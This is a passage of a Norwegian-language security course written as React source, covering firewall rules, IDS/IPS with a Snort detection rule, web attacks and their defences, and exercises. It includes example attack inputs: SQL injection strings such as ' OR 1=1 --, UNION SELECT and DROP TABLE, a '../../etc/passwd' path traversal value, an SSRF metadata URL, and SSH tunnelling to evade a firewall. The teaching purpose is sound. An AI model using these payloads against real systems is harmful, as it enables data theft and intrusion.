              body: "Moderne paradigme som forkaster perimeter-tankegang: «alt på innsiden er trygt» antas å være feil. Hver request, også internt, autentiseres og autoriseres eksplisitt. Micro-segmentering: hver workload har sin egen lille brannmur-policy basert på identitet, ikke IP.",
            },
            {
              term: "Iptables/nftables-regel-syntaks",
              body: "Linux-kjernens innebygde pakkefilter. nftables (moderne) erstatter iptables. Regler organiseres i tabeller (filter, nat) → kjeder (INPUT, FORWARD, OUTPUT) → individuelle regler. Eks: «iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT». Conntrack-modulen gir stateful-funksjonen.",
            },
          ]}
        />
        <Illustration caption="Regel-evaluering i et pakkefilter — top-down match, første treff bestemmer, deny som siste regel.">
          <FirewallRulesSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor er stateful inspeksjon nesten alltid bedre enn stateless?">
        <p>
          Tenk på en intern bruker som henter en webside fra en utvendig server. TCP-håndtrykket er
          klient: SYN, server: SYN-ACK, klient: ACK — etter det flyter data fritt begge veier.
          Klientens kildeport er en ephemeral port (eks. 49152). En stateless brannmur som vil
          tillate svar-pakkene må åpne ALLE høye porter (1024-65535) for innkommende trafikk fra
          utlandet, fordi den ikke kan forutsi hvilken ephemeral-port klienten valgte. Det betyr i
          praksis at hele interne LAN er åpent for skann fra utenfra på alle høye porter.
        </p>
        <p>
          En stateful brannmur ser SYN-en gå ut, legger (klient-IP, 49152, server-IP, 80) inn i sin
          conntrack-tabell, og ETTER det slipper bare gjennom innkommende pakker som matcher den
          flow-en. Ingen åpne ephemeral-porter for verden — bare for det ene utgående
          forbindelses-paret. Forskjellen er enorm i angreps-overflate, og den eneste reelle
          kostnaden er minne for conntrack-tabellen. Derfor er stateless pakkefilter i dag bare
          relevant for høyhastighets-edge der man ikke har tid til lookup, og selv der er det ofte
          hardware-stateful.
        </p>
      </Hvorfor>

      <Example title="Eksempel: regelsett for en liten bedrift">
        <p>
          Bedriften vil at interne hosts skal kunne nå hva som helst på web; men ingen utenfra skal
          kunne koble til noe internt unntatt en mailserver på 10.0.0.25 (SMTP) og en webserver på
          10.0.0.80 (HTTP/HTTPS).
        </p>
        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`# Inn fra internett
1. allow tcp any  -> 10.0.0.25  port 25      # SMTP til mail
2. allow tcp any  -> 10.0.0.80  port 80,443  # web
3. allow tcp any  -> 10.0.0.0/24 established # svar på utgående
4. deny  any  any -> any                     # alt annet inn

# Ut fra LAN
5. allow tcp 10.0.0.0/24 -> any  port 80,443,53,25
6. deny  any -> any`}
        </pre>
        <p className="mt-2 text-muted-foreground">
          Regel 3 («established») er stateful-essensen — uten den hadde svar på utgående
          forespørsler blitt droppet av regel 4.
        </p>
      </Example>

      <Example title="Eksempel: regel-evaluering pakke for pakke">
        <p>Vi har dette regelsettet (top-down, første match vinner):</p>
        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`1. allow tcp 10.0.0.0/24 -> any            port 80,443  (web ut)
2. deny  tcp any         -> 10.0.0.50      port 22      (SSH til admin-server kun internt)
3. allow tcp 10.0.0.0/24 -> 10.0.0.50      port 22      (intern SSH)
4. allow tcp any         -> 10.0.0.80      port 80,443  (public web)
5. allow tcp any         -> any            established  (svar)
6. deny  any any         -> any                         (catch-all)`}
        </pre>
        <p className="mt-2">Trace for fire pakker:</p>
        <ul className="list-disc pl-5 mt-1 space-y-1">
          <li>
            <strong>Pakke A:</strong> 10.0.0.7 → 1.1.1.1:443. Regel 1 matcher (src i 10.0.0.0/24,
            dst-port 443). <em>Tillatt</em>. Conntrack legges til, så svaret slipper inn via regel
            5.
          </li>
          <li>
            <strong>Pakke B:</strong> 198.51.100.5 → 10.0.0.50:22 (SSH utenfra). Regel 1 matcher
            ikke (src ikke i 10.0.0.0/24). Regel 2 matcher (src=any, dst=10.0.0.50, port=22).
            <em> Avvist</em> før regel 3 ses.
          </li>
          <li>
            <strong>Pakke C:</strong> 10.0.0.7 → 10.0.0.50:22 (intern SSH). Regel 1 matcher ikke
            (port ikke 80/443). Regel 2 matcher dessverre OGSÅ — «any &rarr; 10.0.0.50:22» dekker
            både interne og eksterne. <em>Avvist</em>. <strong>Feil rekkefølge!</strong> Regel 2 og
            3 må byttes, så regel 3 (mer spesifikk) evalueres først.
          </li>
          <li>
            <strong>Pakke D:</strong> 203.0.113.9 → 10.0.0.80:443 (legitim web-besøkende). Regel 1
            matcher ikke. Regel 2 matcher ikke. Regel 3 matcher ikke. Regel 4 matcher.
            <em> Tillatt</em>.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Lærdom: rekkefølge er semantisk. Spesifikke regler (engere kriterier) skal stå før
          generelle. En av de vanligste konfigurasjons-feilene i pakkefilter er at en for tidlig
          deny-regel slukker en senere allow.
        </p>
      </Example>

      <RelatedSlugs slugs={["dte2507-stateful-firewall", "dte2507-brannmur-pakkeflyt"]} />
    </article>
  );
}

// ============================================================
// 8.8 — IDS & IPS
// ============================================================
function Section88() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.8" title="IDS og IPS — å oppdage og stoppe innbrudd" />

      <p className="text-muted-foreground">
        En brannmur sier ja eller nei basert på pakkens header. Men hva med trafikk som ser legitim
        ut på utsiden, men inneholder et angrep i selve payload-en — et exploit mot en bug i
        webserveren, for eksempel? Det er her IDS-er og IPS-er kommer inn.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "IDS (Intrusion Detection System)",
              body: "Passivt system som inspiserer trafikken og varsler ved mistenkelig aktivitet. Påvirker ikke pakkeflyten — bare logger og varsler en operatør. Brukes ofte for å oppdage angrep man ikke har klart å forhindre.",
            },
            {
              term: "IPS (Intrusion Prevention System)",
              body: "Som IDS, men plassert in-line: kan også droppe eller blokkere ondsinnede pakker i sanntid. Risiko: false positives stopper legitim trafikk, så IPS-er kjøres ofte konservativt — bare høyt sikre mønstre blokkeres, resten bare logges.",
            },
            {
              term: "Signatur-basert deteksjon",
              body: "Sammenligner trafikken mot en database av kjente angreps-mønstre («signaturer»). Sterk side: lav false-positive-rate, nøyaktige varsler — du vet akkurat hva angrepet er. Svak side: ser bare angrep noen allerede har beskrevet; nye angrep og varianter glipper.",
            },
            {
              term: "Anomali-basert deteksjon",
              body: "Lærer hva «normal» trafikk ser ut som og varsler ved avvik. Kan fange ukjente angrep. Svak side: høyere false-positive-rate, og «normal» er en bevegelig baseline — endringer i bedriftens bruk gir falske varsler.",
            },
            {
              term: "DPI (Deep Packet Inspection)",
              body: "Inspeksjon av selve payload-innholdet, ikke bare header-feltene. Krever mye mer prosessering per pakke og blir vanskelig med TLS-kryptert trafikk. Mange organisasjoner setter opp en TLS-terminerende proxy internt for å kunne kjøre DPI.",
            },
            {
              term: "False positive vs false negative",
              body: "En FP er et varsel uten et reelt angrep (irriterende, bygger varsel-tretthet). En FN er et reelt angrep som glipper (farlig). Operatører må balansere reglene — for streng gir for mange FP, for slappe gir for mange FN.",
            },
            {
              term: "Snort og Suricata",
              body: "To populære open-source IDS/IPS-motorer. Bruker tekstuelle regler som beskriver pakke-mønstre («alert tcp any any -> $HOME_NET 80 (content: «/etc/passwd»; sid: 1001)»). Stort økosystem av ferdige regelsett (Emerging Threats, Talos).",
            },
            {
              term: "NIDS vs HIDS",
              body: "NIDS (Network IDS): inspiserer pakker på lenken. Ser hele organisasjonens trafikk, men ikke innhold av kryptert trafikk eller hva som faktisk skjer på endepunktene. HIDS (Host IDS): kjører på selve hosten. Ser system-kall, fil-endringer, registry-endringer. Krever agent på hver host, men ser ting NIDS ikke kan.",
            },
            {
              term: "SPAN-port (Switched Port Analyzer)",
              body: "Konfigurasjon på switch der trafikk fra én eller flere porter speiles ut til en analyse-port. IDS-en kobles dit og ser kopi av all interessant trafikk uten å være in-line. Lavt risiko (kan ikke selv blokkere ved feil), men også ute av stand til å stoppe angrep i sanntid.",
            },
            {
              term: "Network TAP",
              body: "Fysisk eller virtuell enhet som setter seg i en lenke og kopierer alle pakker ut. Mer pålitelig enn SPAN-port (tar ikke skade av switch-overbelastning) og brukes der ekte fullstendig sikkerhets-mon krever 100 % pakke-fangst.",
            },
            {
              term: "False-positive-rate (FPR) og presisjon",
              body: "FPR = andel godkjent trafikk som likevel utløser alarm. Presisjon = andel alarmer som faktisk er angrep. Begge avhenger av rate of attacks. Selv en 99 % nøyaktig detektor i et nett med 1 angrep per million pakker vil generere overveldende mange falske alarmer — Bayes' setning slår beinhardt.",
            },
            {
              term: "Alarm-tretthet",
              body: "Operatør-fenomen der mange falske alarmer fører til at ekte alarmer ignoreres. Studier av store SOC-er viser at >50 % av alarmer aldri følges opp. Forsvar: tune regler aggressivt, korreler alarmer fra ulike kilder, prioriter på alvorlighetsgrad.",
            },
            {
              term: "EDR (Endpoint Detection and Response)",
              body: "Moderne HIDS-arvtagere: kjører på endepunkt, samler telemetri (prosess-trær, nettverks-koblinger, fil-tilganger) til en sentral analyse-tjeneste. Bruker både regler og ML-baseline. Crowdstrike, SentinelOne, Microsoft Defender for Endpoint er kommersielle eksempler.",
            },
            {
              term: "SIEM (Security Information and Event Management)",
              body: "Sentralisert plattform som samler logger fra brannmur, IDS, EDR, autentiserings-systemer, applikasjoner. Korrelerer hendelser på tvers, kjører regler som spenner kilder («mistenkelig login + database-dump i etterkant»). Splunk, Elastic SIEM, Microsoft Sentinel er typiske.",
            },
            {
              term: "Honeypot og deception",
              body: "Falsk system designet for å lokke til seg angripere. All trafikk til det er per definisjon mistenkelig — ingen legitime brukere skal ha kontakt med en honeypot. Gir høy presisjon på alarmene og innsikt i angreps-teknikker. Brukes også til å forsinke pågående angrep.",
            },
            {
              term: "Begrensninger i kryptert verden",
              body: "TLS-kryptering gjør DPI praktisk umulig uten at IDS terminerer TLS internt (egne sertifikater på klientene). Mange organisasjoner setter opp en TLS-terminerende proxy på utkanten av nett for å gjøre IDS-deteksjon. Personvern-tradeoff: nå ser bedriften innholdet i alle ansattes web-trafikk.",
            },
            {
              term: "Kill chain og MITRE ATT&CK",
              body: "Rammeverk for å beskrive angrep i faser: rekognosering, initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, exfiltration. MITRE ATT&CK er et detaljert taksonomi-rammeverk som mappet TTP-er (Tactics, Techniques, Procedures). IDS-regler taggges ofte mot ATT&CK-ID-er.",
            },
          ]}
        />
        <Illustration caption="IDS sniffer trafikken via et SPAN-port og varsler operatøren. IPS sitter in-line og kan blokkere.">
          <IdsIpsSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor har signatur-basert IDS lav false-positive men anomali-basert høy?">
        <p>
          Signatur-basert deteksjon bygger på et eksplisitt mønster — typisk en konkret byte-sekvens
          eller et regex som matcher kjent angreps-kode (eks. <code>/etc/passwd</code> i en
          HTTP-URI, en spesifikk shellcode-sekvens). Hvis mønsteret er tett nok knyttet til
          angrepet, vil normal trafikk svært sjelden matche tilfeldig — false-positive-raten er lav.
          Prisen er at du kun ser angrep noen allerede har skrevet en signatur for; en angriper som
          varierer payload-en eller bruker et helt nytt exploit, glipper.
        </p>
        <p>
          Anomali-basert deteksjon bygger en statistisk modell av «normal» trafikk og varsler på
          avvik. Den fanger ukjente angrep, men har et grunnleggende problem: «normal» er en
          bevegelig baseline. En ny CRM-deploy, sesong-skift, eller bare en innleid konsulent som
          gjør noe uvanlig, vil utløse alarm. Selv 1 % falske positive på milliarder av pakker per
          dag betyr titusener av alarmer å sile gjennom. I praksis bruker organisasjoner derfor
          signatur-basert som forsvarslinje, anomali-basert for å oppdage avvik som krever manuell
          analyse, og EDR/SIEM-korrelasjon for å løfte presisjonen.
        </p>
      </Hvorfor>

      <Example title="Eksempel: en enkel Snort-regel">
        <pre className="rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`alert tcp $EXTERNAL_NET any -> $HOME_NET 80 ( \\
   msg: "WEB-ATTACK passwd file access";          \\
   content: "GET";   http_method;                  \\
   content: "/etc/passwd"; http_uri;               \\
   classtype: web-application-attack;              \\
   sid: 10001; rev: 1; )`}
        </pre>
        <p className="mt-2">
          Regelen alarmerer hvis noen utenfor sender en HTTP GET der URI-en inneholder{" "}
          <code>/etc/passwd</code> — et klassisk forsøk på path traversal mot Unix-servere. Sid er
          en unik identifikator; classtype gir IDS-en en kategori for prioritering.
        </p>
      </Example>

      <RelatedSlugs slugs={["dte2507-ids-snort"]} />
    </article>
  );
}

// ============================================================
// 8.9 — Web-angrep
// ============================================================
function Section89() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.9" title="Web-angrep og forsvar" />

      <p className="text-muted-foreground">
        TLS, brannmurer og IDS beskytter transport og perimeter. Men de stopper ikke angrep mot
        selve applikasjonen — hvor de fleste innbruddene i dag skjer. Tre klassiske mønstre
        dominerer: skript-injeksjon (XSS), kryss-forespørsler (CSRF) og SQL-injeksjon.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "XSS (Cross-Site Scripting)",
              body: "Angriperen klarer å få sin egen JavaScript til å kjøre i en annen brukers nettleser, i konteksten av et legitimt nettsted. Stjeler typisk session-cookies eller spiller av handlinger som brukeren. Tre varianter: stored (skript lagres i database), reflected (skript ekkes tilbake fra URL) og DOM-based (skript injiseres via klient-side parsing).",
            },
            {
              term: "XSS-forsvar",
              body: "Kontekst-bevisst escaping av all brukerdata før den settes inn i HTML, og en streng Content-Security-Policy (CSP) som forbyr inline scripts og kun tillater skript fra spesifikke origins. innerHTML-tilordninger med ukontrollert input er en magnet for XSS — bruk textContent eller en escape-funksjon.",
            },
            {
              term: "CSRF (Cross-Site Request Forgery)",
              body: "Angriperen lurer offerets nettleser til å sende en forespørsel mot et annet domene der offeret allerede er innlogget. F.eks. en skjult form på evil.com som POST-er til bank.no/overforing. Nettleseren legger automatisk ved bank.no-cookies, og banken tror forespørselen er legitim.",
            },
            {
              term: "CSRF-forsvar",
              body: "(1) CSRF-tokens: server genererer et tilfeldig tokens per sesjon, embedder det i alle skjemaer, og krever det ved hver state-changing request. Evil.com kan ikke gjette tokenet. (2) SameSite-cookies: nettleseren slutter å sende cookies på cross-site requests. (3) Origin/Referer-header-sjekk.",
            },
            {
              term: "SQL-injeksjon",
              body: "Brukerdata konkateneres inn i en SQL-streng uten parameter-binding, slik at angriperen kan endre selve spørringen. Klassisk: «SELECT * FROM users WHERE name='» + input + «'» — sett input til «' OR 1=1 --» og hele tabellen returneres.",
            },
            {
              term: "SQL-injeksjon-forsvar",
              body: "Bruk forberedte spørringer (prepared statements) med parameter-binding overalt. Da behandles brukerdata som data, aldri som SQL-syntaks. Stored procedures og ORM-er gir samme beskyttelse hvis de ikke har emergency-escape-luker. Validering av input er bare ekstra-belte, ikke selve forsvaret.",
            },
            {
              term: "OWASP Top 10",
              body: "Liste over de ti mest kritiske web-applikasjons-risikoene, oppdatert hvert par år. Injeksjons-angrep og broken access control har vært på topp i flere år. Bruk den som sjekkliste i kode-review og når man bygger trusselsmodell for en applikasjon.",
            },
            {
              term: "Stored XSS (persistent)",
              body: "Angriperen lagrer skriptet i applikasjonens database — kommentarfelt, brukerprofil, forum-innlegg. Hver fremtidig leser eksekverer det. Mest skadelig variant fordi den treffer alle brukere som ser den infiserte siden, uten at angriperen trenger å lokke dem til en spesiell URL.",
            },
            {
              term: "Reflected XSS",
              body: "Skriptet er i URL-en og «reflekteres» tilbake usanitisert i HTML-svaret. Krever at angriper får offeret til å klikke en spesiallaget lenke (typisk via phishing). Eksempel: <code>site.no/search?q=&lt;script&gt;...&lt;/script&gt;</code> hvor søkestrengen ekkes uten escaping.",
            },
            {
              term: "DOM-based XSS",
              body: "Hele angrepet skjer i klient-side JavaScript — serveren returnerer trygg HTML, men noe JS plukker opp <code>location.hash</code> eller URL-parameter og setter det inn i DOM via innerHTML. Server-loggene ser ingen ondskap; bare nettleser-instrumentering eller kode-audit finner det.",
            },
            {
              term: "Content Security Policy (CSP)",
              body: "HTTP-header som forteller nettleseren hvilke kilder JS, CSS, bilder etc. får hentes fra. <code>Content-Security-Policy: script-src 'self' https://apis.google.com</code> stopper alle skript fra ukjente origins, inkludert injiserte inline-skripts. Krever streng disiplin — ingen <code>onclick=...</code>-attributter i HTML.",
            },
            {
              term: "SameSite-cookies",
              body: "Cookie-attributt som styrer om nettleseren skal sende cookien på cross-site requests. <code>Strict</code>: aldri. <code>Lax</code> (default nå): bare på top-level navigation (klikk på lenke). <code>None</code>: alltid (men krever Secure). Lax + tokens stopper de fleste CSRF-angrep.",
            },
            {
              term: "CSRF-token-implementasjon",
              body: "Standard mønster: server genererer kryptografisk tilfeldig token, lagrer i bruker-sesjonen, embedder det som skjult input i alle skjemaer. Ved POST sammenligner server token i forms-data mot sesjon. Double-submit-cookie er en variant uten server-state: token settes som cookie OG i form, server sammenligner.",
            },
            {
              term: "SQL-injeksjons-typer",
              body: "(1) Klassisk in-band: angriperen ser resultatet direkte i svaret. (2) Blind boolean-based: utleder bit for bit via om svaret er forskjellig (eks. true/false-side). (3) Blind time-based: <code>WHERE x = ' OR (SELECT SLEEP(5))</code> — målt forsinkelse avslører svar. (4) Out-of-band: data eksfiltreres via en separat kanal (DNS-oppslag fra serveren).",
            },
            {
              term: "Prepared statements / parameter-binding",
              body: "Databasen får SQL-strengen med <code>?</code>-placeholders og verdiene som adskilte argumenter. Driveren binder dem på protokoll-nivå — verdiene kan aldri tolkes som SQL-syntaks. Stopper SQL-injeksjon fullstendig. ORM-er bruker dette under panseret.",
            },
            {
              term: "Server-Side Request Forgery (SSRF)",
              body: "Applikasjonen henter en URL angitt av bruker (eks. «importer profilbilde fra denne URL-en»). Angriperen får serveren til å hente fra interne IP-er — <code>http://169.254.169.254/</code> avslører cloud-metadata med IAM-credentials. Forsvar: validér URL-mål, blokker private IP-rom og DNS-rebinding.",
            },
            {
              term: "Path traversal",
              body: "Bruker-input legges inn i filsti uten validering: <code>open('/var/www/uploads/' + filename)</code> der filename = <code>'../../etc/passwd'</code>. Leser sensitive filer utenfor tiltenkt katalog. Forsvar: validér at resolved path er prefiks av tillatt katalog, ikke bare strip <code>..</code>.",
            },
            {
              term: "Click-jacking og X-Frame-Options",
              body: "Angriperens side innebed offerets nettsted i en usynlig iframe og lokker offer til å klikke på det de tror er en del av angriperens side, men som faktisk er en knapp i offerets innloggede sesjon. Forsvar: <code>X-Frame-Options: DENY</code> eller CSP <code>frame-ancestors 'none'</code>.",
            },
            {
              term: "Sub-resource Integrity (SRI)",
              body: "Når du laster ekstern JS (CDN) kan du oppgi en hash av forventet innhold: <code>&lt;script integrity=&quot;sha384-...&quot;&gt;</code>. Hvis CDN-en kompromitteres og bytter ut skriptet, matcher ikke hashen og nettleseren nekter å kjøre det. Lite kost, stort gevinst mot supply-chain-angrep.",
            },
          ]}
        />
        <Illustration caption="CSRF-flyt: offer er innlogget på bank, besøker evil.com som POST-er til bank med offerets cookies.">
          <CsrfSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor er prepared statements det eneste forsvaret som faktisk fungerer mot SQL-injeksjon?">
        <p>
          Mange utviklere prøver først å «sanitisere» bruker-input — sjekke for farlige tegn, escape
          apostrofer, blokkere ord som DROP eller UNION. Det er nesten alltid utilstrekkelig.
          Eksempler: en numerisk parameter forventes uten anførsel, så input <code>1 OR 1=1</code>
          slipper gjennom escape-funksjonen som bare håndterer apostrofer. Eller serveren bruker
          MySQL's <code>mysql_real_escape_string</code> som er bevisst feil-tunet hvis tegnsettet er
          ulikt det driveren tror. WAF-er som blokkerer SQL-nøkkelord brytes med kommentar-
          inkludering (<code>UN/**/ION</code>) eller obfuskering.
        </p>
        <p>
          Prepared statements eliminerer hele problem-klassen ved å SKILLE syntaks fra data på
          protokoll-nivå. SQL-strengen sendes først til databasen, som parser den og lager en
          execution-plan med placeholders. Senere sendes verdiene som binær data adskilt fra
          SQL-strukturen. Selv om verdien er <code>'; DROP TABLE users; --</code> er den fra
          databasens perspektiv bare en literal streng som havner i WHERE-klausulen — den kan aldri
          endre strukturen. Det er ikke et filter; det er en arkitektonisk separasjon. Derfor er
          parameter-binding (eller en ORM som bruker det under panseret) det eneste ekte forsvaret.
        </p>
      </Hvorfor>

      <Example title="Eksempel: SQL-injeksjon-fiks med forberedt spørring">
        <pre className="rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`// SÅRBART — konkatenering
const q = "SELECT id FROM users " +
          "WHERE name = '" + name + "' " +
          "AND pwd = '" + pwd + "'";
db.query(q);

// TRYGT — parameter-binding
const q = "SELECT id FROM users WHERE name = ? AND pwd = ?";
db.query(q, [name, pwd]);`}
        </pre>
        <p className="mt-2">
          I den trygge versjonen sendes <code>?</code>-placeholderene og verdiene adskilt til
          database-driveren. Driveren binder dem på protokoll-nivå — verdiene kan ikke endre
          spørringens struktur uansett hva angriperen taster. Selv <code>' OR 1=1 --</code> blir
          behandlet som et helt navn.
        </p>
      </Example>

      <RelatedSlugs slugs={["web-angrep"]} />
    </article>
  );
}

// ============================================================
// 8.10 — Oppgaver
// ============================================================
function Section810() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.10" title="Oppgaver" />
      <p className="text-muted-foreground">
        Fem oppgaver som binder sammen kapittelets temaer. Skjul svaret først og prøv selv — det er
        der læringen sitter.
      </p>

      <Exercise
        question="Alice vil sende en konfidensiell OG autentisert melding m til Bob, hvor hun også kan bevises å være avsender (ikke-avvisning). Hun har Bobs RSA-offentlige nøkkel og sitt eget RSA-nøkkel-par. Tegn meldings-flyten med RSA + AES + HMAC."
        hint="Hybrid: bruk RSA for nøkkelen, AES for innholdet. Hva tilfører digital signering oppå dette?"
        answer={
          <>
            <ol className="list-decimal pl-5 space-y-1">
              <li>Alice genererer en tilfeldig AES-nøkkel K og en HMAC-nøkkel K_m.</li>
              <li>
                Alice krypterer meldingen: C = AES-GCM(K, m). GCM gir også integritets-tag, men hun
                legger på en eksplisitt HMAC-SHA256(K_m, C) for klarhetens skyld i oppgaven.
              </li>
              <li>
                Alice signerer en hash av C med sin egen private RSA-nøkkel: s = RSA-sign(privA,
                SHA256(C)). Dette gir ikke-avvisning — bare Alice kan ha laget s.
              </li>
              <li>
                Alice krypterer (K, K_m) med Bobs offentlige RSA-nøkkel: e = RSA-enc(pubB, K||K_m).
              </li>
              <li>Alice sender pakken (e, C, HMAC, s) til Bob.</li>
              <li>
                Bob dekrypterer e med privB → får K og K_m. Verifiserer HMAC (integritet).
                Dekrypterer C med K (konfidensialitet). Verifiserer s med pubA (autentisering +
                ikke-avvisning).
              </li>
            </ol>
            <p className="mt-2 text-muted-foreground">
              Merk: RSA brukes til to forskjellige formål her — kryptering av symmetrisk nøkkel (med
              Bobs offentlige), og signering (med Alices private). De er logisk uavhengige.
            </p>
          </>
        }
      />

      <Exercise
        question="Forklar med egne ord hvorfor TLS 1.3 dropper RSA-key-exchange. Hva slags angrep blir mulig hvis man fortsatt bruker det, og hva er navnet på egenskapen som mistes?"
        hint="Tenk på hva som skjer hvis bankens private nøkkel lekker — har det betydning for trafikk fra i fjor?"
        answer={
          <>
            <p>
              I gammel RSA-key-exchange krypterte klienten et pre-master secret med serverens
              offentlige RSA-nøkkel. Hvis serverens private RSA-nøkkel lekker senere, kan en
              angriper som har sittet og lagret kryptert trafikk i flere år, dekryptere alle gamle
              pre-master secrets — og dermed alle gamle sesjoner.
            </p>
            <p className="mt-2">
              Egenskapen som mistes heter <strong>Forward Secrecy</strong>. Løsningen er at man i
              stedet bruker en éphemeral DH-utveksling (ECDHE) der hver part lager en fersk privat
              verdi for akkurat den ene handshaken og kaster den umiddelbart etterpå. Serverens
              langvarige nøkkel brukes da bare til å SIGNERE DH-andelen, ikke til å transportere
              selve pre-master. Lekkasje av serverens nøkkel lar en angriper falske fremtidige
              handshakes (det er ille i seg selv), men dekrypterer ikke gamle sesjoner.
            </p>
            <p className="mt-2 text-muted-foreground">
              TLS 1.3 fjernet RSA-key-exchange helt fra protokollen. Alle cipher suites bruker ECDHE
              eller PSK med (EC)DHE.
            </p>
          </>
        }
      />

      <Exercise
        question="En enkel pakkefilter-brannmur har bare denne regelen: «tillat TCP til port 443 inn, blokker alt annet». Kan en angriper smugle SSH gjennom? Hvordan, og hva slags forsvar trenger man?"
        hint="Hva er det brannmuren faktisk inspiserer? Hva er det den ikke ser?"
        answer={
          <>
            <p>
              Ja — fordi pakkefilter-brannmuren bare ser på port-nummeret, ikke på protokollens
              innhold. SSH kan kjøres på port 443 i stedet for standard port 22. Da ser pakkene ut
              som «TCP til 443» og slipper gjennom, selv om payload-en er SSH-protokoll. Angriperen
              trenger bare en SSH-server som lytter på port 443 utenfor brannmuren.
            </p>
            <p className="mt-2">
              Mer avansert: SSH kan også tunneles inni HTTPS via verktøy som corkscrew eller sslh,
              slik at selv DPI som ser etter SSH-handshake kun ser TLS. Insiders bruker dette
              regelmessig for å omgå bedriftens politikk.
            </p>
            <p className="mt-2">
              Forsvar: (1) <strong>Applikasjons-bevisst</strong> brannmur eller IPS som inspiserer
              payload og kjenner igjen SSH-handshake-signaturen. (2){" "}
              <strong>TLS-terminering</strong> på en intern proxy som dekrypterer trafikken og kan
              inspisere applikasjons-protokollen. (3) <strong>Egress-filtrering</strong> som
              begrenser hvilke destinasjoner interne maskiner får snakke med på 443. (4){" "}
              <strong>Endpoint-kontroll</strong> som forhindrer at brukere kjører SSH-klienter med
              rare config-flagg i utgangspunktet.
            </p>
          </>
        }
      />

      <Exercise
        question={
          <>
            Du leser denne kodebiten på en webserver:{" "}
            <code className="font-mono text-[11px]">
              {`db.query("SELECT * FROM orders WHERE customer = '" + req.query.id + "'")`}
            </code>
            . Identifiser sårbarheten, vis et angrep, og skriv en sikker versjon.
          </>
        }
        hint="Hva slags input vil kunne bryte ut av strengen og endre spørringens struktur?"
        answer={
          <>
            <p>
              Sårbarheten er klassisk SQL-injeksjon — <code>req.query.id</code> konkateneres direkte
              inn i SQL-stringen uten escaping eller parameter-binding.
            </p>
            <p className="mt-2">
              Angrep: kall endepunktet med <code className="text-[11px]">?id=' OR 1=1 --</code>.
              Spørringen blir <code>SELECT * FROM orders WHERE customer = '' OR 1=1 --'</code> —{" "}
              alle ordre returneres uansett kundenavn. Verre varianter kan kjøre
              <code> UNION SELECT password FROM users</code> for å lekke andre tabeller, eller{" "}
              <code>DROP TABLE</code> for å slette data.
            </p>
            <p className="mt-2">Trygg versjon med parameter-binding:</p>
            <pre className="mt-1 rounded bg-muted/30 p-2 font-mono text-[11px]">
              {`db.query(
  "SELECT * FROM orders WHERE customer = ?",
  [req.query.id]
);`}
            </pre>
            <p className="mt-2 text-muted-foreground">
              Driveren sender SQL-stringen og verdien adskilt til databasen som parametriserer på
              protokoll-nivå. Brukerens input blir nå alltid behandlet som data, aldri som
              SQL-syntaks. Som ekstra forsvar bør webserveren også kjøre med en db-bruker som ikke
              har DROP/ALTER- rettigheter.
            </p>
          </>
        }
      />

      <Exercise
        question="Bedriften din vil sette opp en site-to-site-tunnel mellom Oslo-kontoret (gateway 198.51.100.5) og Bergen-kontoret (gateway 203.0.113.9). Begge interne nett er 10.0.0.0/16. Velg IPsec-modus og forklar pakke-flyten for en ping fra 10.0.1.5 (Oslo) til 10.0.2.7 (Bergen)."
        hint="Tunnel eller transport? Hvilken IP-pakke ser internett mellom gateways?"
        answer={
          <>
            <p>
              Velg <strong>IPsec ESP i tunnel-mode</strong>. Transport-mode ville krevet at de
              interne IP-ene var rutbare på internett, og det er de ikke (privat 10.0.0.0/16).
              Tunnel-mode kapsler hele originalpakken i en ny ytre IP-pakke mellom gateway-IP-ene.
            </p>
            <p className="mt-2">Pakke-flyt:</p>
            <ol className="list-decimal pl-5 mt-1 space-y-1">
              <li>
                10.0.1.5 sender ICMP echo til 10.0.2.7. Pakken når Oslo-gateway via vanlig intern
                ruting.
              </li>
              <li>
                Oslo-gateway gjør oppslag i sin SPD (Security Policy Database) → «trafikk til
                10.0.2.0/24 skal gjennom tunnel mot 203.0.113.9».
              </li>
              <li>
                Den krypterer hele original-pakken (header + ICMP) med tunnelens ESP-SA, og pakker
                resultatet i en ytre IP-header: src 198.51.100.5, dst 203.0.113.9, protocol = ESP
                (50).
              </li>
              <li>
                Pakken sendes over internett. Mellomliggende rutere ser bare
                gateway-til-gateway-trafikk; interne adresser og innhold er kryptert.
              </li>
              <li>
                Bergen-gateway mottar ESP-pakken, slår opp SPI-en i sin SAD, dekrypterer,
                verifiserer sekvensnummer mot anti-replay-vinduet, og finner originalpakken.
              </li>
              <li>
                Original-pakken (10.0.1.5 → 10.0.2.7) leveres videre inn i Bergens 10.0.2.0/24 og
                når 10.0.2.7, som svarer normalt. Svaret følger samme prosess i motsatt retning.
              </li>
            </ol>
            <p className="mt-2 text-muted-foreground">
              Nøklene som ESP bruker ble forhandlet frem av IKEv2 tidligere, før første data-pakke;
              gateways har en SA i hver retning og roterer nøklene jevnlig.
            </p>
          </>
        }
      />

      <Exercise
        question="En logge-server lagrer passord som SHA-256-hash uten salt. En angriper får tak i hele tabellen. Forklar to angreps-strategier (rainbow-table og brute-force per bruker) og hva som hadde stoppet hver av dem."
        hint="Hva er kostnaden ved å regne ut én SHA-256? Hva endrer seg hvis hver bruker har sin egen salt?"
        answer={
          <>
            <p>
              <strong>Strategi 1 — rainbow-table:</strong> Angriper laster ned en forhåndsregnet
              tabell av (passord, SHA-256(passord)) for de mest brukte passordene (ca. 14 mill. mest
              sannsynlige). For HVER lekket hash sjekker hun oppslag i tabellen — finner en match i
              løpet av millisekunder. Hele tabellen er ca. 500 GB, men én engangskostnad.
            </p>
            <p className="mt-2">
